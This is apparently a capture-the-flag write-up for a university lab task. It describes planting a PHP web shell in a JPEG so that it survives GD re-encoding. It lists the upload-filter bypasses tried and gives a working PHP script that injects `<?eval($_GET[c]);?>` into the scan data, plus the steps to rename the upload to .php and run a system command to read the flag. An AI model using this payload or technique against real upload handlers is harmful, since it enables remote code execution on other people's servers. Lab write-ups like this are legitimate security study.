> Jpeg – http://jpg.tasks.prak.seclab.cs.msu.ru

**Attack name:** JPEG Polyglot – PHP injection into SOS compressed data (bypassing GD resampling)

3 months later, I finally finished this cursed task... I don't even know where to start.

**Preface:** This task took me 7 full days, 12+ hours each day – research, looking at data, talking to deepseek.

# J P E G

First, you see a default `FileUpload`. You need to upload an image and get the flag. Obviously we need code inside the image? How to put it there?

Normal php tricks – there's a filter. Let's try mixing.

**1) Double extensions, polyglots**  
Using Burp, try changing format. Just change .jpg to .php – nothing.  
Try inserting minimal php code into the image – doesn't work, code doesn't execute... )))

**2) Filename validation** – bypass with double extension `shell.php.png`, null byte `shell.php%00.jpg`, `.php5`, `.phtml`. Doesn't work.

**3) Whitelist extensions** – no.

**4) Sanitizers** – like `shell.p.phphp` becomes `shell.php`. Also no.

**5) Content-Type** – change to `image/png`. Getting interesting, but still not enough.

**6) `.htaccess`** – tried root, parent folders – doesn't work.

**7) Back to polyglots**

JPEG structure:
- `FF D8` – SOI (start)
- `FF DA` – SOS (start of scan) – 2‑byte header length follows
- then compressed scan data
- `FF D9` – EOI (end)

I try putting php code:
- between `FF D8` and `FF DA`
- between `FF DA` and `FF D9`
- in COM (comment) section – gets deleted by the parser
- after `FF D9` – doesn't survive

Nothing works. Why?

After upload, server returns `/uploads/[hash]/1.php`.  
I open it – binary garbage, no execution.

Download the processed image with `curl`:

```bash
curl -o gg_exit.php "http://.../uploads/.../polyglot_exif.php"
```

Check inside:
```
CREATOR: gd-jpeg v1.0 (using IJG JPEG v62), quality = 90
```
My code is gone. The server compresses to quality=90 and strips everything.

---

### Experiments with minimal JPEG

Minimal valid jpeg (hex):

```
ffd8 ffe0 0010 4a46 4946 0001 0101 0048 0048 0000 ffdb 0043 ... ffda 0008 0101 0000 3f00 d9
```

If I just insert php code between `ffd8` and `ffda` – the file becomes invalid.  
If I add `AAAA...` before `ffda` – the image changes, but code doesn't survive.

### The final solution (after 7 days of hell)

You have to insert php code **into the compressed data section**, but carefully.

**Where exactly:**  
Find marker `FF DA`, read the next 2 bytes – that's the SOS header length.  
Skip that many bytes + 2. The next byte is the start of compressed data. Insert the code there.

**Code that survives:**  
Minimal payload – `<?eval($_GET[c]);?>` – shorter is better.

**Injection script (my original, in php):**

```php
<?php
$inputFile = 'w2.jpg';
$outputFile = 'a1.jpg';
$phpCode = '<?eval($_GET[c]);?>FF4HB442HBJH225HFFF';  // garbage to protect the payload

$escapedCode = '';
for ($i = 0; $i < strlen($phpCode); $i++) {
    $escapedCode .= $phpCode[$i];
}

$jpegData = file_get_contents($inputFile);
$pos = strpos($jpegData, "\xFF\xDA");
if ($pos === false) die("SOS marker not found");

$length = unpack('n', substr($jpegData, $pos + 2, 2))[1];

$outputData = substr($jpegData, 0, $pos + $length + 2) 
            . $escapedCode 
            . substr($jpegData, $pos + $length + 2);

file_put_contents($outputFile, $outputData);
echo "Payload created: $outputFile\n";
?>
```

**Problem:**  
Not every image works. I tried:
- white squares from 50x50 to 1000x1000 step 50
- gradients
- random jpgs from the internet
- quality=100 (lower fails)

After each variant – check what survived.

**Signs of a good payload (visual inspection):**
- image opens in Linux (Windows might fix broken jpgs, but GD won't)
- no horizontal split defect
- no black squares
- small defects top‑left – **awesome**

**Then:**
1. Upload the image as `1.jpg`.
2. Get the link to the processed image, download it, check bytes – if `<?php` is intact, proceed.
3. Modify the upload request: change `filename` to `1.php`.
4. Get the link `/uploads/[id]/1.php`.
5. Visit – if you see php errors, the code didn't survive. If gibberish, append `?c=system('cat /var/flag.txt');`

---

### THE SOLUTION – APPLY THE SCRIPT TO THE IMAGE **DOWNLOADED FROM THE SERVER**

ALLLLLOOOOOOOOOOOOOOOOOO

Take the image that the server already processed (but that doesn't contain the code yet), run our injection script on **that** image, then upload it again. Then GD doesn't break the structure because it's already compressed.

**GG.**  
Flag obtained.

> [!NOTE]
> This was hell. I hope you never have to do this task.
